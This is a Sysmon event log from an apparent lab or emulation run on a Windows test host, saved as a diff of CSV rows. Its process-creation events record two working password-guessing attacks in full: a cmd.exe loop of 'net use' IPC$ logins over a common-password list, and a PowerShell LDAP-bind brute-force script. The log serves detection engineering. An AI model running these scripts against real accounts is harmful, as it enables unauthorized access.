+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:36:10.541
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:36:10.526
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:36:09.527
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:36:09.119
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+PipeName: \PSHost.133461381688248859.6188.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:36:09.041
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_hmazwu5l.0fz.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:36:08.978
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_hmazwu5l.0fz.ps1
+CreationUtcTime: 2023-12-04 04:36:08.978
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:36:08.947
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:08.916
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:08.900
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:08.884
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:08.884
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:08.884
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:36:08.822
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5738-656d-f602-000000001000}
+TargetProcessId: 6188
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1083,technique_name=File and Directory Discovery
+UtcTime: 2023-12-04 04:36:08.824
+ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
+ProcessId: 6188
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
+  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
+  exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)
+
+$passwordList = Get-Content -Path \""""C:temp\T1110.001\src\passwords.txt\""""
+foreach ($password in $passwordList){
+  $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\"""")
+  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+  try {
+    Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\""""
+    $conn.bind()
+    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+    Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\""""
+  } catch {
+    Write-Host $_.Exception.Message
+  }
+}
+Write-Host \""""End of bruteforce\""""}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:36:08.822
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:06 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
+RuleName: -
+UtcTime: 2023-12-04 04:36:04.515
+ProcessGuid: {1ac2ee8c-5734-656d-f502-000000001000}
+ProcessId: 1948
+QueryName: desktop-92iijb9
+QueryStatus: 0
+QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
+Image: C:\Windows\System32\net.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:04 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1018,technique_name=Remote System Discovery
+UtcTime: 2023-12-04 04:36:04.467
+ProcessGuid: {1ac2ee8c-5734-656d-f502-000000001000}
+ProcessId: 1948
+Image: C:\Windows\System32\net.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Net Command
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: net.exe
+CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""ChangeMe! ""  
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
+ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
+ParentProcessId: 5704
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:02 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
+RuleName: -
+UtcTime: 2023-12-04 04:36:00.395
+ProcessGuid: {1ac2ee8c-5730-656d-f402-000000001000}
+ProcessId: 4376
+QueryName: desktop-92iijb9
+QueryStatus: 0
+QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
+Image: C:\Windows\System32\net.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:00 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1018,technique_name=Remote System Discovery
+UtcTime: 2023-12-04 04:36:00.360
+ProcessGuid: {1ac2ee8c-5730-656d-f402-000000001000}
+ProcessId: 4376
+Image: C:\Windows\System32\net.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Net Command
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: net.exe
+CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""Spring2022 ""  
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
+ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
+ParentProcessId: 5704
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:58 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
+RuleName: -
+UtcTime: 2023-12-04 04:35:56.249
+ProcessGuid: {1ac2ee8c-572c-656d-f302-000000001000}
+ProcessId: 8644
+QueryName: desktop-92iijb9
+QueryStatus: 0
+QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
+Image: C:\Windows\System32\net.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:56 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1018,technique_name=Remote System Discovery
+UtcTime: 2023-12-04 04:35:56.216
+ProcessGuid: {1ac2ee8c-572c-656d-f302-000000001000}
+ProcessId: 8644
+Image: C:\Windows\System32\net.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Net Command
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: net.exe
+CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""Password! ""  
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
+ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
+ParentProcessId: 5704
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:54 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
+RuleName: -
+UtcTime: 2023-12-04 04:35:52.104
+ProcessGuid: {1ac2ee8c-5728-656d-f202-000000001000}
+ProcessId: 5188
+QueryName: desktop-92iijb9
+QueryStatus: 0
+QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
+Image: C:\Windows\System32\net.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:52 PM,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
+RuleName: technique_id=T1099,technique_name=Timestomp
+UtcTime: 2023-12-04 04:35:52.462
+ProcessGuid: {1ac2ee8c-542b-656d-1a01-000000001000}
+ProcessId: 244
+Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MsMpEng.exe
+TargetFilename: C:temp\bin\BrowserCollector.exe
+CreationUtcTime: 2023-12-04 04:27:49.338
+PreviousCreationUtcTime: 2023-12-04 04:27:49.338
+User: NT AUTHORITY\SYSTEM"
+Information,12/3/2023 8:35:52 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1018,technique_name=Remote System Discovery
+UtcTime: 2023-12-04 04:35:52.070
+ProcessGuid: {1ac2ee8c-5728-656d-f202-000000001000}
+ProcessId: 5188
+Image: C:\Windows\System32\net.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Net Command
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: net.exe
+CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""1q2w3e4r ""  
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
+ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
+ParentProcessId: 5704
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:48 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
+RuleName: -
+UtcTime: 2023-12-04 04:35:47.960
+ProcessGuid: {1ac2ee8c-5723-656d-f102-000000001000}
+ProcessId: 2024
+QueryName: desktop-92iijb9
+QueryStatus: 0
+QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
+Image: C:\Windows\System32\net.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:47 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1018,technique_name=Remote System Discovery
+UtcTime: 2023-12-04 04:35:47.901
+ProcessGuid: {1ac2ee8c-5723-656d-f102-000000001000}
+ProcessId: 2024
+Image: C:\Windows\System32\net.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Net Command
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: net.exe
+CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""Password1 ""  
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
+ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
+ParentProcessId: 5704
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:47 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:47.775
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5723-656d-ef02-000000001000}
+TargetProcessId: 5704
+TargetImage: C:\Windows\system32\cmd.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:47 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2023-12-04 04:35:47.787
+ProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
+ProcessId: 5704
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
